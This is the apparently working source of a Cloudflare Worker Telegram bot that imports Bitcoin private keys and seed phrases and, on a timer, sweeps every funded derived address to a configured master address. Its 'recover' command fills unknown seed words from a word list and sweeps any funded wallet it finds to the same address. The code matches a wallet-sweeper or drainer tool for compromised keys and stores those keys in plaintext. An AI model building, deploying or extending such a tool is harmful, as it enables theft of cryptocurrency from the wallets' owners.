import * as bitcoin from 'bitcoinjs-lib';
import * as bip39 from 'bip39';
import { BIP32Factory } from 'bip32';
import * as ecc from '@bitcoinerlab/secp256k1';
import { ECPairFactory } from 'ecpair';
import { Buffer } from 'buffer';

globalThis.Buffer = Buffer;
const bip32 = BIP32Factory(ecc);
const ECPair = ECPairFactory(ecc);
bitcoin.initEccLib(ecc); 

const NETWORK = bitcoin.networks.bitcoin;
const DEFAULT_SAT_PER_BYTE = 15;
const ESPLORA_API = 'https://blockstream.info/api';
const MAX_RECOVERY_ATTEMPTS = 30;

const PATHS = {
  legacy:  "m/44'/0'/0'/0",
  segwit:  "m/49'/0'/0'/0",
  native:  "m/84'/0'/0'/0"
};

function isValidAddress(address) {
  try {
    bitcoin.address.toOutputScript(address, NETWORK);
    return true;
  } catch (e1) {
    try {
      bitcoin.address.toOutputScript(address, bitcoin.networks.testnet);
      return true;
    } catch (e2) {
      return false;
    }
  }
}

function detectKeyType(text) {
  const t = text.trim();
  if (!t) return 'unknown';
  if (bip39.validateMnemonic(t)) return 'mnemonic';
  if (/^[5KLc9][1-9A-HJ-NP-Za-km-z]{50,51}$/.test(t)) return 'wif';
  if (/^[0-9a-fA-F]{64}$/.test(t)) return 'hex';
  if (/^xprv[1-9A-HJ-NP-Za-km-z]{107}$/.test(t)) return 'xprv';
  if (/^yprv[1-9A-HJ-NP-Za-km-z]{107}$/.test(t)) return 'yprv';
  if (/^zprv[1-9A-HJ-NP-Za-km-z]{107}$/.test(t)) return 'zprv';
  if (/^tprv[1-9A-HJ-NP-Za-km-z]{107}$/.test(t)) return 'tprv';
  if (isValidAddress(t)) return 'address';
  return 'unknown';
}

function deriveAddressesFromMnemonic(mnemonic, scanDepth) {
  const results = [];
  try {
    const seed = bip39.mnemonicToSeedSync(mnemonic);
    const root = bip32.fromSeed(seed, NETWORK);
    for (const [type, basePath] of Object.entries(PATHS)) {
      for (let i = 0; i < scanDepth; i++) {
        try {
          const child = root.derivePath(basePath + '/' + i);
          if (!child.privateKey) continue;
          const privKey = Buffer.from(child.privateKey);
          const keyPair = ECPair.fromPrivateKey(privKey, { network: NETWORK });
          const pubkey = Buffer.from(keyPair.publicKey);
          let payment;
          if (type === 'legacy') {
            payment = bitcoin.payments.p2pkh({ pubkey, network: NETWORK });
          } else if (type === 'segwit') {
            payment = bitcoin.payments.p2sh({ redeem: bitcoin.payments.p2wpkh({ pubkey, network: NETWORK }), network: NETWORK });
          } else {
            payment = bitcoin.payments.p2wpkh({ pubkey, network: NETWORK });
          }
          if (payment.address) results.push({ address: payment.address, keyPair, type, index: i });
        } catch (e) {}
      }
    }
  } catch (e) { console.error('Mnemonic error:', e); }
  return results;
}

function deriveAddressesFromXprv(xprvKey, scanDepth) {
  const results = [];
  try {
    const node = bip32.fromBase58(xprvKey, NETWORK);
    for (let i = 0; i < scanDepth; i++) {
      try {
        const child = node.derive(0).derive(i);
        if (!child.privateKey) continue;
        const privKey = Buffer.from(child.privateKey);
        const keyPair = ECPair.fromPrivateKey(privKey, { network: NETWORK });
        const pubkey = Buffer.from(keyPair.publicKey);
        const payment = bitcoin.payments.p2pkh({ pubkey, network: NETWORK });
        if (payment.address) results.push({ address: payment.address, keyPair, type: 'xprv', index: i });
      } catch (e) {}
    }
  } catch (e) { console.error('xprv error:', e); }
  return results;
}

function deriveAddressesFromWif(wif) {
  try {
    const keyPair = ECPair.fromWIF(wif);
    const pubkey = Buffer.from(keyPair.publicKey);
    const payment = bitcoin.payments.p2pkh({ pubkey, network: keyPair.network });
    return [{ address: payment.address, keyPair, type: 'wif', index: 0 }];
  } catch (e) { console.error('WIF error:', e); return []; }
}

function deriveAddressesFromHex(hex) {
  try {
    const keyPair = ECPair.fromPrivateKey(Buffer.from(hex, 'hex'), { network: NETWORK });
    const pubkey = Buffer.from(keyPair.publicKey);
    const payment = bitcoin.payments.p2pkh({ pubkey, network: NETWORK });
    return [{ address: payment.address, keyPair, type: 'hex', index: 0 }];
  } catch (e) { console.error('Hex error:', e); return []; }
}

function getAllAddresses(secret, scanDepth) {
  const type = detectKeyType(secret);
  if (type === 'mnemonic') return deriveAddressesFromMnemonic(secret, scanDepth);
  if (type === 'xprv' || type === 'yprv' || type === 'zprv' || type === 'tprv') return deriveAddressesFromXprv(secret, scanDepth);
  if (type === 'wif') return deriveAddressesFromWif(secret);
  if (type === 'hex') return deriveAddressesFromHex(secret);
  return [];
}

async function getUtxos(address) {
  try { const r = await fetch(ESPLORA_API + '/address/' + address + '/utxo'); return r.ok ? await r.json() : []; } catch { return []; }
}
async function getTxHex(txid) {
  const r = await fetch(ESPLORA_API + '/tx/' + txid + '/hex');
  if (!r.ok) throw new Error('tx hex failed');
  return r.text();
}
async function getAddressBalance(address) {
  try {
    const r = await fetch(ESPLORA_API + '/address/' + address);
    if (!r.ok) return 0;
    const d = await r.json();
    return ((d.chain_stats?.funded_txo_sum || 0) - (d.chain_stats?.spent_txo_sum || 0)) + ((d.mempool_stats?.funded_txo_sum || 0) - (d.mempool_stats?.spent_txo_sum || 0));
  } catch { return 0; }
}
async function getAddressTransactions(address, limit) {
  try { const r = await fetch(ESPLORA_API + '/address/' + address + '/txs'); return r.ok ? (await r.json()).slice(0, limit) : []; } catch { return []; }
}
async function getRecommendedFee() {
  try { const r = await fetch(ESPLORA_API + '/fee-estimates'); if (!r.ok) return 15; const e = await r.json(); return Math.ceil(e['1'] || e['2'] || 15); } catch { return 15; }
}
function formatTime(ts) { return ts ? new Date(ts * 1000).toISOString().replace('T', ' ').substring(0, 19) + ' UTC' : 'Unconfirmed'; }
function formatBtc(sats) { return (sats / 1e8).toFixed(8); }

async function createSweepTx(keyPair, utxos, toAddress, feeRate, addrType) {
  const total = utxos.reduce((s, u) => s + u.value, 0);
  const fee = (utxos.length * 180 + 44) * feeRate;
  const amount = total - fee;
  if (amount <= 546) return { error: 'Balance too low' };
  const psbt = new bitcoin.Psbt({ network: NETWORK });
  for (const u of utxos) {
    const isLegacy = (addrType === 'legacy' || addrType === 'wif' || addrType === 'hex' || addrType === 'xprv');
    if (isLegacy) {
      psbt.addInput({ hash: u.txid, index: u.vout, nonWitnessUtxo: Buffer.from(await getTxHex(u.txid), 'hex') });
    } else {
      const pub = Buffer.from(keyPair.publicKey);
      const pay = addrType === 'segwit' ? bitcoin.payments.p2sh({ redeem: bitcoin.payments.p2wpkh({ pubkey: pub, network: NETWORK }), network: NETWORK }) : bitcoin.payments.p2wpkh({ pubkey: pub, network: NETWORK });
      psbt.addInput({ hash: u.txid, index: u.vout, witnessUtxo: { script: pay.output, value: u.value } });
      if (addrType === 'segwit') psbt.updateInput(psbt.inputCount - 1, { redeemScript: pay.redeem.output });
    }
  }
  psbt.addOutput({ address: toAddress, value: amount });
  for (let i = 0; i < utxos.length; i++) psbt.signInput(i, { publicKey: Buffer.from(keyPair.publicKey), network: keyPair.network, sign: (h, l) => Buffer.from(keyPair.sign(h, l)) });
  psbt.finalizeAllInputs();
  return { hex: psbt.extractTransaction().toHex(), amount, fee };
}

async function broadcastTx(hex) {
  const r = await fetch(ESPLORA_API + '/tx', { method: 'POST', headers: { 'Content-Type': 'text/plain' }, body: hex });
  if (!r.ok) throw new Error(await r.text());
  return r.text();
}

async function sendMsg(botToken, chatId, text, kb) {
  try {
    if (!botToken || !chatId) return;
    await fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML', reply_markup: kb }) });
  } catch (e) { console.error('TG error:', e); }
}

function mainMenu() {
  return { inline_keyboard: [
    [{ text: '🔑 Import', callback_data: 'import' }, { text: '🔍 Recover', callback_data: 'recover' }],
    [{ text: '📋 List', callback_data: 'list' }, { text: '🗑️ Remove', callback_data: 'remove' }],
    [{ text: '🧹 Sweep', callback_data: 'sweep' }, { text: '📊 Balance', callback_data: 'balance' }],
    [{ text: '🔍 Txs', callback_data: 'txs' }, { text: '📤 Send To', callback_data: 'sendto' }],
    [{ text: '➕ Add Recipient', callback_data: 'addrecipient' }],
    [{ text: '⏸️ Pause', callback_data: 'pause' }, { text: '▶️ Resume', callback_data: 'resume' }],
    [{ text: '🧪 Test API', callback_data: 'testapi' }]
  ]};
}

async function getWallets(env, cid) { return (await env.WALLETS.get('w_' + cid, 'json')) || []; }
async function saveWallets(env, cid, w) { await env.WALLETS.put('w_' + cid, JSON.stringify(w)); }
async function getRecipients(env, cid) { return (await env.WALLETS.get('r_' + cid, 'json')) || []; }
async function saveRecipients(env, cid, r) { await env.WALLETS.put('r_' + cid, JSON.stringify(r)); }

async function checkAddressBalance(env, cid, addr) {
  if (!isValidAddress(addr)) return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '❌ Invalid address');
  await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '🔍 Checking...');
  const bal = await getAddressBalance(addr);
  await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '📊 <b>Address:</b> <code>' + addr + '</code>\n💰 ' + formatBtc(bal) + ' BTC');
}

async function checkAddressTxs(env, cid, addr) {
  if (!isValidAddress(addr)) return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '❌ Invalid address');
  await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '🔍 Fetching...');
  const txs = await getAddressTransactions(addr, 3);
  let msg = '📊 <b>' + addr + '</b>\n';
  msg += txs.length ? txs.map(t => (t.status?.confirmed ? '✅' : '⏳') + ' ' + t.txid.slice(0, 16)).join('\n') : 'None';
  await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, msg);
}

async function checkAllBalances(env, cid) {
  const wallets = await getWallets(env, cid);
  if (!wallets.length) return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '📭 <b>No wallets imported.</b>');
  await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '📊 Checking...');
  let msg = '📊 <b>Balances:</b>\n', total = 0;
  for (const w of wallets) {
    let wTotal = 0;
    for (const a of getAllAddresses(w.mnemonic || w.wif || w.hex || w.xprv, 5)) wTotal += await getAddressBalance(a.address);
    total += wTotal; msg += '🔹 ' + w.label + ': ' + formatBtc(wTotal) + ' BTC\n';
  }
  await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, msg + '\n💰 Total: ' + formatBtc(total) + ' BTC');
}

async function sweepAll(env, cid, target) {
  const dest = target || env.MASTER_ADDRESS;
  if (!dest || (await env.WALLETS.get('PAUSED')) === 'true') return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '⏸️ Paused or no dest.');
  const wallets = await getWallets(env, cid);
  if (!wallets.length) return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '❌ No wallets.');
  let report = [], total = 0;
  for (const w of wallets) {
    for (const a of getAllAddresses(w.mnemonic || w.wif || w.hex || w.xprv, 5)) {
      const utxos = await getUtxos(a.address);
      if (!utxos.length) continue;
      const bal = utxos.reduce((s, u) => s + u.value, 0);
      if (bal < 10000) continue;
      const res = await createSweepTx(a.keyPair, utxos, dest, Math.min(await getRecommendedFee(), 50), a.type);
      if (res.error) continue;
      const txid = await broadcastTx(res.hex);
      report.push('✅ ' + w.label + ' sent ' + formatBtc(res.amount) + ' BTC\nTx: ' + txid);
      total += res.amount;
    }
  }
  await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, total > 0 ? '🚀 Swept ' + formatBtc(total) + ' BTC!\n' + report.join('\n') : 'ℹ️ No funds.');
}

async function recoverSeed(env, cid, pattern, dictStr) {
  const dict = dictStr.split(',').map(w => w.trim().toLowerCase()).filter(w => w);
  const words = pattern.toLowerCase().split(/\s+/);
  const wilds = words.map((w, i) => w === '?' ? i : -1).filter(i => i >= 0);
  if (!wilds.length) return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '❌ Use ? for unknown words.');
  const cands = [];
  if (wilds.length === 1) { for (const w of dict) { const t = [...words]; t[wilds[0]] = w; cands.push(t.join(' ')); if (cands.length >= 20) break; } }
  else { for (const a of dict) { for (const b of dict) { const t = [...words]; t[wilds[0]] = a; t[wilds[1]] = b; cands.push(t.join(' ')); if (cands.length >= 20) break; } if (cands.length >= 20) break; } }
  await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '🔍 Scanning ' + cands.length + '...');
  let found = 0;
  for (const m of cands) {
    if (!bip39.validateMnemonic(m)) continue;
    for (const a of deriveAddressesFromMnemonic(m, 3)) {
      if ((await getAddressBalance(a.address)) > 0) {
        found++;
        await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '💰 FUNDED: ' + m + '\nSweeping...');
        const utxos = await getUtxos(a.address);
        const res = await createSweepTx(a.keyPair, utxos, env.MASTER_ADDRESS, 15, a.type);
        if (!res.error) await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '✅ Swept: ' + (await broadcastTx(res.hex)));
      }
    }
  }
  await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '🎉 Found ' + found);
}

async function importSingleKey(env, cid, secret) {
  const type = detectKeyType(secret);
  if (type === 'unknown' || type === 'address') return { ok: false, msg: 'Not a key' };
  const addrs = getAllAddresses(secret, 5);
  if (!addrs.length) return { ok: false, msg: 'No addresses' };
  const wallets = await getWallets(env, cid);
  if (wallets.some(w => (w.mnemonic || w.wif || w.hex || w.xprv) === secret)) return { ok: false, msg: 'Exists' };
  const entry = { label: 'Wallet ' + (wallets.length + 1) };
  if (type === 'mnemonic') entry.mnemonic = secret; else if (type === 'wif') entry.wif = secret; else if (type === 'hex') entry.hex = secret; else entry.xprv = secret;
  wallets.push(entry);
  await saveWallets(env, cid, wallets);
  return { ok: true, msg: '✅ Imported ' + entry.label + '\n' + addrs[0].address };
}

async function handleUpdate(update, env) {
  if (!update.message && !update.callback_query) return;
  let cid, text = '', cb = '';
  if (update.message) { cid = update.message.chat.id; text = update.message.text || ''; }
  else if (update.callback_query) {
    cid = update.callback_query.message?.chat?.id || update.callback_query.from.id;
    cb = update.callback_query.data;
    fetch('https://api.telegram.org/bot' + env.TELEGRAM_BOT_TOKEN + '/answerCallbackQuery', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ callback_query_id: update.callback_query.id }) }).catch(() => {});
  }
  if (!cid) return;

  if (cb) {
    if (cb === 'menu' || cb === 'start') return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '🤖 Bot', mainMenu());
    if (cb === 'import') return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, 'Send key or comma separated keys.');
    if (cb === 'recover') return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, 'Use: /recover <pattern with ?> <word1,word2>');
    if (cb === 'list') { const w = await getWallets(env, cid); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, w.length ? w.map(x => '🔹 ' + x.label).join('\n') : '📭 Empty'); }
    if (cb === 'remove') { const w = await getWallets(env, cid); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, w.length ? 'Select:' : '📭 <b>No wallets to remove.</b>\nImport first!', w.length ? { inline_keyboard: w.map((x, i) => [{ text: '🗑️ ' + x.label, callback_data: 'del_' + i }]) } : null); }
    if (cb === 'sweep') { await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '🧹 Sweeping...'); return await sweepAll(env, cid); }
    if (cb === 'balance') return await checkAllBalances(env, cid);
    if (cb === 'txs') return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, 'Use /txs <address>');
    if (cb === 'addrecipient') return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, 'Send BTC address');
    if (cb === 'sendto') { const r = await getRecipients(env, cid); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, 'Select:', { inline_keyboard: r.map((x, i) => [{ text: x.slice(0, 20), callback_data: 'send_' + i }]) }); }
    if (cb === 'pause') { await env.WALLETS.put('PAUSED', 'true'); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '⏸️'); }
    if (cb === 'resume') { await env.WALLETS.put('PAUSED', 'false'); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '▶️'); }
    if (cb === 'testapi') return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '🧪 Fee: ' + (await getRecommendedFee()));
    if (cb.startsWith('del_')) { const i = +cb.slice(4), w = await getWallets(env, cid); if (i < w.length) { w.splice(i, 1); await saveWallets(env, cid, w); await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, 'Removed'); } return; }
    if (cb.startsWith('send_')) { const i = +cb.slice(5), r = await getRecipients(env, cid); if (i < r.length) { await sweepAll(env, cid, r[i]); } return; }
    return;
  }

  const cmd = text.split(' ')[0].split('@')[0];
  const args = text.split(' ').slice(1);
  if (cmd === '/start' || cmd === '/menu') return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '🤖 Bot', mainMenu());
  if (cmd === '/balance') { if (args[0]) return await checkAddressBalance(env, cid, args[0]); return await checkAllBalances(env, cid); }
  if (cmd === '/txs' || cmd === '/scan') { if (args[0]) return await checkAddressTxs(env, cid, args[0]); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, 'Usage: /txs <address>'); }
  if (cmd === '/recover') { if (args.length < 2) return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, 'Usage: /recover <pattern> <dict>'); return await recoverSeed(env, cid, args.slice(0, -1).join(' '), args[args.length - 1]); }
  if (cmd === '/sweep') { await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '🧹'); return await sweepAll(env, cid); }
  if (cmd === '/pause') { await env.WALLETS.put('PAUSED', 'true'); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '⏸️'); }
  if (cmd === '/resume') { await env.WALLETS.put('PAUSED', 'false'); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '▶️'); }
  if (cmd === '/list') { const w = await getWallets(env, cid); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, w.length ? w.map(x => '🔹 ' + x.label).join('\n') : '📭 Empty'); }
  if (cmd === '/add') { if (!args[0] || !isValidAddress(args[0])) return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '❌'); const r = await getRecipients(env, cid); if (!r.includes(args[0])) { r.push(args[0]); await saveRecipients(env, cid, r); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '✅ Added'); } return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, 'Exists'); }
  if (cmd === '/send') { if (!args[0] || !isValidAddress(args[0])) return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '❌'); await sweepAll(env, cid, args[0]); return; }
  
  if (text.includes(',')) {
    const keys = text.split(','); let ok = 0, fail = 0;
    for (const k of keys) { const r = await importSingleKey(env, cid, k.trim()); r.ok ? ok++ : fail++; }
    return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '📦 Done: ' + ok + ' ok, ' + fail + ' fail');
  }

  const type = detectKeyType(text);
  if (['mnemonic', 'wif', 'hex', 'xprv', 'yprv', 'zprv', 'tprv'].includes(type)) { const r = await importSingleKey(env, cid, text); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, r.msg); }
  if (type === 'address') { const r = await getRecipients(env, cid); if (!r.includes(text)) { r.push(text); await saveRecipients(env, cid, r); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '✅ Added'); } return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, 'Exists'); }

  await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '❓ Use /start', mainMenu());
}

export default {
  async scheduled(event, env, ctx) { ctx.waitUntil(sweepAll(env, env.TELEGRAM_CHAT_ID)); },
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    if (request.method === 'POST' && url.pathname === '/telegram-webhook') {
      try {
        const update = await request.json();
        ctx.waitUntil((async () => {
          try { await handleUpdate(update, env); } catch (e) { console.error(e); }
        })());
      } catch (e) { console.error(e); }
      return new Response('OK');
    }
    if (request.headers.get('Authorization') !== 'Bearer ' + env.ADMIN_TOKEN) return new Response('Unauthorized', { status: 401 });
    return new Response('Not found', { status: 404 });
  }
};
